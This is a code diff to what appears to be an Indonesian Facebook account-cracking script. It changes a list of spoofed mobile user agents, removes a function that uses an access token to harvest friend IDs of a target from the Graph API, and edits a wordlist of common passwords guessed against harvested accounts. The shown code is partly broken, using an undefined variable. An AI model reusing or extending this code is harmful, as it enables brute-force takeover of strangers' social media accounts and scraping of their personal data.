@@ -33,7 +33,7 @@ from rich.columns import Columns as col
 try:ugen = open('user.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36 OPR/25.0.1619.84037','Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; en-in) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP']
 try:ugen2 = open('user2.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
+except:ugen2 = ['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36 OPR/25.0.1619.84037','Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; en-in) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP']
 
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
@@ -220,40 +220,7 @@ def bottzy():
 	
 def kanjoed():
 	main()
-def dump():
-	try:
-		it = input('%s[%s•%s] %sID Target : '%(O,P,O,P))
-		try:
-			token = open('token.txt','r').read()
-			mm = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
-			print ('%s[%s•%s] %sName : %s'%(O,P,O,P,mm['name']))
-		except (KeyError,IOError):
-			jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
-			menu_lagi()
-		tt=[]
-		te=[]
-		lim = input('%s[%s•%s] %sLimit Dump : '%(O,P,O,P))
-		print('%s>_%s'%(O,P))
-		ada = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
-		idi = json.loads(ada.text)
-		for x in idi['data']:
-			tt.append(x['id'])
-		for id in tt:
-			try:
-				ada2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
-				idi2 = json.loads(ada2.text)
-				try:
-					for b in idi2['data']:
-						te.append(b['id'])
-				except KeyError:
-					print('[!] Private')
-				print('[•]',id,'•',len(te))
-				te.clear()
-			except KeyError:
-				print('[!] Spam Accounts')
-		print('║')
-		input('kembali') 
-		menu()
+
 	except:pass
 def result():
 	cek = '>_Cek Hasil Crack'
@@ -564,7 +531,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
+			pwv = ['sayang','bangsat','sayang123','bismillah','anjing','katasandi','indonesia']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
